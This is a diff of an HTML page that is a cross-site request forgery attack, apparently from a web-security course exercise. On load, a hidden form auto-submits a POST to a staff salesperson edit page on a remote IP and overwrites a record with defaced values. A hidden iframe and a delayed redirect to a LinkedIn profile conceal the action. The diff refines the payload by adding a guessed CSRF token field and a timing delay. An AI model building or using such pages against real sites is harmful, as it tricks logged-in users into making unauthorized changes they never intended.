@@ -1,17 +1,21 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>404 Not Found</title>
+    <title>Loading</title>
   </head>
   <body onload="document.leform.submit()">
-    <p>404 Not Found</p>
     <form action="https://35.184.88.145/red/public/staff/salespeople/edit.php?id=1" name="leform" method="POST" style="display: none;" target="leframe">
-      <input type="text" name="first_name" value="Daron"><br>
-      <input type="text" name="last_name" value="Borked"><br>
-      <input type="text" name="phone" value="555-925-3685"><br>
-      <input type="text" name="email" value="dburke@salesperson.com"><br>
+        <input type="hidden" name="csrf_token" value="any token"/>
+        <input type="text" name="first_name" value="Daron">
+        <input type="text" name="last_name" value="Borked">
+        <input type="text" name="phone" value="555-925-3685">
+        <input type="text" name="email" value="dburke@salesperson.com">
     </form>
     <iframe name="leframe" style="display: none;"></iframe>
-    <script>window.location.assign("https://www.linkedin.com/in/williamhgates/")</script>
+    <script>
+        window.setTimeout(function leredirect() {
+            window.location.assign("https://www.linkedin.com/in/williamhgates/")
+        }, 500);
+    </script>
   </body>
 </html>
